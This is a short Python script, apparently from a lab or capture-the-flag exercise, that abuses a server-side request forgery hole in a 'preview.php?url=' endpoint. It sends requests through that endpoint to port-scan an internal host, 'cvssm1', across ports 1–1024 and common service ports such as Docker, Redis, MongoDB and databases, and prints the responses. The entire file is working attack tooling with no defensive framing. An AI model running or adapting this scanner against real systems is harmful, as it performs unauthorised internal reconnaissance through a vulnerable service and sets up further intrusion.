import requests, urllib.parse
from concurrent.futures import ThreadPoolExecutor

base = 'http://10.82.159.192/preview.php?url='

# Ports to scan: common ones + full 1-1024
ports = list(range(1, 1025)) + [3000, 3001, 4000, 4200, 4443, 5000, 5001, 8000, 8080, 8081,
                                  8443, 8888, 9000, 9090, 9200, 9300, 9443, 9999,
                                  2375, 2376, 5432, 3306, 6379, 11211, 27017]
ports = sorted(set(ports))

open_ports = []

def check_port(port):
    url = f'http://cvssm1:{port}/'
    try:
        r = requests.get(base + urllib.parse.quote(url, safe=''), timeout=4)
        body = r.text.strip()
        if body and len(body) > 0 and 'blocked' not in body.lower():
            return (port, len(body), body[:80].replace('\n', ' '))
    except Exception:
        pass
    return None

print(f'Scanning {len(ports)} ports...')
with ThreadPoolExecutor(max_workers=5) as ex:
    for result in ex.map(check_port, ports):
        if result:
            port, size, preview = result
            print(f'[OPEN] :{port}  ({size}b)  {preview}')
            open_ports.append(result)

print(f'\nDone. Open: {[p[0] for p in open_ports]}')
